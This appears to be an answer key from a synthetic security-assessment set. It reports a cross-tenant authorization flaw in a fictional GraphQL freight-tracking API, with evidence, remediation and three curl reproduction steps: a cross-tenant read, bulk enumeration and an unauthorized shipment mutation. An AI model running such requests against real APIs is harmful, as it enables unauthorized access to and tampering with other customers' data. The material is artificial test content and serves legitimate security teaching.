# Expected Response

## System
- Domain: Logistics / Supply Chain
- System: FreightLens Tracking API
- Example ID: GQL-0063

## Priority Findings

### Finding 1: Cross-Tenant Shipment Access via Single GraphQL Endpoint — Missing Per-Operation Authorization (Pattern 9.1)
**Severity:** Critical
**Category:** BOLA / GraphQL Platform

**Summary:**
Per §4.0 (RISK-GQL-063): "`getShipment` resolver fetches by `shipmentId` only. Does NOT verify that the fetched object's `tenantId` matches the JWT's `tenantId`." Per §5.0 (Pattern 9.1): the GraphQL single-endpoint pattern means all operations including sensitive mutations are accessible at one URL with missing per-operation authorization. An attacker from `tenant-68a3` read shipment `S-2063` owned by `tenant-bfb2`, exposing logistics PII.

**Evidence from HAR:**
- Request: `POST https://api.freightlens-tracking.example.com/graphql` (2026-04-13T16:22:34Z)
- JWT `x-tenant-id`: `tenant-68a3`
- Query: `getShipment(id: "S-2063") { shipmentId tenantId ownerId data { sensitiveField internalNotes } }`
- Response `200 OK`; `tenantId: "tenant-bfb2"`, `ownerId: "other-user-68a3bfb2"`, `sensitiveField: "CONFIDENTIAL-68a3bfb2"`, `internalNotes: "Internal data exposed"`
- `x-request-id: req-68a3bfb2`

**Root Cause (§4.0 RISK-GQL-063):** Resolver fetches by ID only; no tenantId match. Single endpoint exposes all operations without per-operation auth checks.

## Steps to Reproduce

### Step 1 — Cross-tenant shipment read (HAR)
```bash
curl -s -X POST https://api.freightlens-tracking.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" -H "x-tenant-id: tenant-68a3" \
  -d '{"query": "query VulnerableOp { getShipment(id: \"S-2063\") { shipmentId tenantId ownerId data { sensitiveField internalNotes } } }"}'
```
**Vulnerable:** Returns `CONFIDENTIAL-68a3bfb2` from `tenant-bfb2`. **Secure:** FORBIDDEN.

### Step 2 — Bulk cross-tenant shipment enumeration
```bash
curl -s -X POST https://api.freightlens-tracking.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" -H "x-tenant-id: tenant-68a3" \
  -d '{"query": "mutation { bulkShipmentLookup(ids: [\"S-2063\", \"S-1063\", \"S-3063\"]) { shipmentId tenantId data { sensitiveField } } }"}'
```
**Vulnerable:** Returns shipment records from `tenant-bfb2`.

### Step 3 — Unauthorized mutation via single endpoint
```bash
curl -s -X POST https://api.freightlens-tracking.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" -H "x-tenant-id: tenant-68a3" \
  -d '{"query": "mutation { updateShipment(id: \"S-2063\", input: {status: \"delivered\"}) { shipmentId status } }"}'
```
**Vulnerable:** Modifies victim shipment via shared endpoint. **Secure:** FORBIDDEN.

## Evidence Map
| Artifact | Location | Finding |
|---|---|---|
| context.txt §4.0 | RISK-GQL-063 | `getShipment` no tenantId check |
| context.txt §5.0 | Pattern 9.1 | Single endpoint; per-operation auth missing |
| HAR request | x-tenant-id | Attacker tenant: `tenant-68a3` |
| HAR response | tenantId field | Victim tenant: `tenant-bfb2` |
| HAR response | sensitiveField | `CONFIDENTIAL-68a3bfb2` |

## Remediation
1. Resolver tenant guard on `getShipment`: `WHERE shipment_id=$id AND tenant_id=$jwt.tenantId`.
2. Per-ID ownership filter in `bulkShipmentLookup`.
3. Implement per-operation authorization middleware at the Apollo Server level (not just schema-level).
4. Redis cache key includes `tenantId`: `shipment:{tenantId}:{shipmentId}`.
